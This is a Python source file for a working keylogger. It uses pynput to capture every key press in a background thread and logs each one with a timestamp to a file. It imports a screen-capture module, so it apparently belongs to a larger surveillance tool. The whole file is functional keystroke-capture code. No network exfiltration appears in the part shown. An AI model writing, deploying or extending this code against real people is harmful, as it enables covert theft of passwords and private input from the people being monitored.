import logging
import threading
from shared_function import *
import time
from pynput.keyboard import Listener
from capture_screen import ASSET_PATH

listener = None

# check directory and create if not exist
if not check_file_exist(ASSET_PATH):
    os.mkdir(ASSET_PATH)

# setup logging
logfile_path = os.path.join(ASSET_PATH, "key_logger.log")
logging.basicConfig(filename=logfile_path,
                    filemode='w',
                    level=logging.DEBUG,
                    format='%(asctime)s [%(levelname)s] %(message)s'
                    )


def key_logger():
    def key_logger():
        global listener

        def on_press(key):
            try:
                print(key)
                logging.info(key)
            except AttributeError:
                print(key)
                logging.error(key)

        with Listener(on_press=on_press) as listener:
            listener.join()

    listener_thread = threading.Thread(target=key_logger)
    listener_thread.start()


def stop_key_logger():
    global listener

    # for test
    print("stop key logger")
    time.sleep(10)
    print("----- stopped ----")
    # end test

    listener.stop()
